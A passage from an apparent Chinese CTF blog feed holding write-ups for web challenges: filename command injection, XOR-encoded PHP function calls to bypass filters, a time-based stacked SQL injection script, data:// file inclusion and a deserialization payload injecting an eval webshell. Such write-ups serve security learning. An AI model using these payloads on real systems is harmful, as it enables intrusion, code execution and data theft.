punctuation">;</span>  <span class="token comment">//system命令执行，抓包改filename即可</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>payload：</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">||</span> `<span class="token keyword">echo</span> bHMgLw<span class="token operator">==</span> <span class="token operator">|</span>base64 <span class="token operator">-</span>d`ls <span class="token operator">/</span><span class="token operator">||</span> `<span class="token keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA<span class="token operator">=</span> <span class="token operator">|</span>base64 <span class="token operator">-</span>d` cat <span class="token operator">/</span>flag_233333</code></pre></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异或^</title>
    <link href="/2021/07/14/%E5%BC%82%E6%88%96/"/>
    <url>/2021/07/14/%E5%BC%82%E6%88%96/</url>
    
    <content type="html"><![CDATA[<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或就是二进制对应位上运算：   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ff对应的是十进制的255，二进制就是<code>111111111</code>,所以它与其他异或后再与原来的异或就等于原来的<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">res<span class="token operator">=</span><span class="token string">'phpinfo'</span>     <span class="token comment">##要异或的</span>temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>    temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> temp<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span><span class="token string">'%ff'</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></code></pre><p><code>phpinfo</code>—-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>—-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(每一部分都要括起来)     </p><h2 id="有字符长度限制的话"><a href="#有字符长度限制的话" class="headerlink" title="有字符长度限制的话"></a>有字符长度限制的话</h2><p>比如:    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></code></pre><p>这个是限定所用的字符种类小于或等于13       </p><p>看看有没有那个字符可以由其它的异或而来    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">res<span class="token operator">=</span><span class="token string">'\'().;_acdinprst'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> res<span class="token punctuation">:</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> res<span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>m <span class="token keyword">or</span> j<span class="token operator">==</span>n <span class="token keyword">or</span> m<span class="token operator">==</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>m<span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>n<span class="token punctuation">)</span></code></pre></code></pre><p>这里用三个来异或一个，两个的话太少，不行<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>随便选三个   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>—-&gt;加上两串<code>(%ff%ff%ff%ff%ff%ff%ff)</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>—–&gt;将对应位置上的字符修改，比如<code>i</code>在第三位，就把前三串的第三位改成<code>c n d</code>对应的<code>%9c %91 %9b</code>—-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandir也换后     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>原本十五个，加上<code>%ff</code>，十六个，减三，十三个</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>or^or</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>knowledge</tag>
      
      <tag>or^or</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/07/11/BUU89/"/>
    <url>/2021/07/11/BUU89/</url>
    
    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>打开是一个登录框<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burp抓包加个<code>&#39;</code>发现报错<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sql注入了，不过报错显示的是<code>fetch()</code>函数错误     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDO下的SQL注入</code></a><br>PDO—&gt;php数据对象       </p><p>PDO支持多语句执行，也就是堆叠注入      </p><p>PDO中的query()函数同数据库交互</p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dbms</span><span class="token operator">=</span><span class="token single-quoted-string string">'mysql'</span><span class="token punctuation">;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token single-quoted-string string">'192.168.27.61'</span><span class="token punctuation">;</span><span class="token variable">$dbName</span><span class="token operator">=</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dsn</span><span class="token operator">=</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$dbms</span></span>:host=<span class="token interpolation"><span class="token variable">$host</span></span>;dbname=<span class="token interpolation"><span class="token variable">$dbName</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from user where id=1;"</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"create table test2 like user"</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p>prepare预处理      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>以此结合十六进制注入    </p><p>找了WP的脚本，但跑不出来-_-</p><pre><code><pre class="language-python" data-language="python"><code class="language-python">    <span class="token comment">#author: c1e4r</span>    <span class="token keyword">import</span> requests    <span class="token keyword">import</span> json    <span class="token keyword">import</span> time    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#题目地址</span>        url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login'''</span>        <span class="token comment">#注入payload</span>        payloads <span class="token operator">=</span> <span class="token string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -"</span>        flag <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#查询payload</span>            payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#将构造好的payload进行16进制转码和json转码</span>                datas <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>payloads<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'test213'</span><span class="token punctuation">&#125;</span>                data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>                times <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>                <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> times <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                    <span class="token keyword">break</span>    <span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span><span class="token punctuation">)</span>    ```  得到`glzjin_wants_a_girl_friend<span class="token punctuation">.</span><span class="token builtin">zip</span>`源码     !<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span>b7c5c05c1929a09f<span class="token punctuation">.</span>png<span class="token punctuation">)</span>     `前端应用逻辑的基础在 controller 文件夹下面，而其他文件都是基于 basecontroller<span class="token punctuation">.</span>php 所以我们打开 basecontroller<span class="token punctuation">.</span>php 文件进行代码审计`          ```php    private $viewPath<span class="token punctuation">;</span>        public function loadView<span class="token punctuation">(</span>$viewName <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> $viewData <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            $this<span class="token operator">-</span><span class="token operator">></span>viewPath <span class="token operator">=</span> BASE_PATH <span class="token punctuation">.</span> <span class="token string">"/View/&#123;$viewName&#125;.php"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">></span>viewPath<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                extract<span class="token punctuation">(</span>$viewData<span class="token punctuation">)</span><span class="token punctuation">;</span>                include $this<span class="token operator">-</span><span class="token operator">></span>viewPath<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span></code></pre></code></pre><p><code>extract</code>可以进行变量覆盖     </p><p>找到<code>UserController.php</code>中调用了<code>loadView</code>且第二个参数可控      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token variable">$userModel</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$userModel</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userList'</span><span class="token punctuation">,</span> <span class="token variable">$listData</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre></code></pre><p>在<code>userindex.php</code>中</p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/../favicon.ico'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span><span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src="'</span> <span class="token punctuation">.</span> <span class="token variable">$img_base64</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">'</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>所以传入<code>img_file=/../flag.php</code>   </p><p>需要先进入<code>userIndex.php</code>，url中修改<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>源码中图片base64解码得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CJBCTF</title>
    <link href="/2021/07/11/CJBCTF/"/>
    <url>/2021/07/11/CJBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul><li>文件包含</li></ul><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-06-29 03:16:43# @Last Modified by:   h1xa# @Last Modified time: 2021-06-30 04:43:37# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">===</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p><p>看到include要想到伪协议了    </p><p>这里用<code>data://text/plain</code>     </p><p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png">    </p><p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>得到flag     </p><h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul><li>代码审计</li></ul><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span><span class="token operator">=</span><span class="token double-quoted-string string">"Hack me!"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token double-quoted-string string">"var_dump"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token double-quoted-string string">"Happy to cjb"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$safe</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\d|\/|,|\([^()]*\([^()]*\)/'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token double-quoted-string string">"var_dump"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span><span class="token operator">=</span><span class="token double-quoted-string string">"You look dangerous!!!"</span><span class="token punctuation">;</span>            <span class="token variable">$safe</span><span class="token operator">=</span><span class="token double-quoted-string string">"I think waf is enough."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$safe</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$info</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/s:4:"name";s:\d:"v\w*"/'</span><span class="token punctuation">,</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"I just love v"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$hacker</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><ul><li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p><p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png">    </p><p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p></li></ul><ul><li><p>第二种思路：利用<code>$safe</code><br>  根目录payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  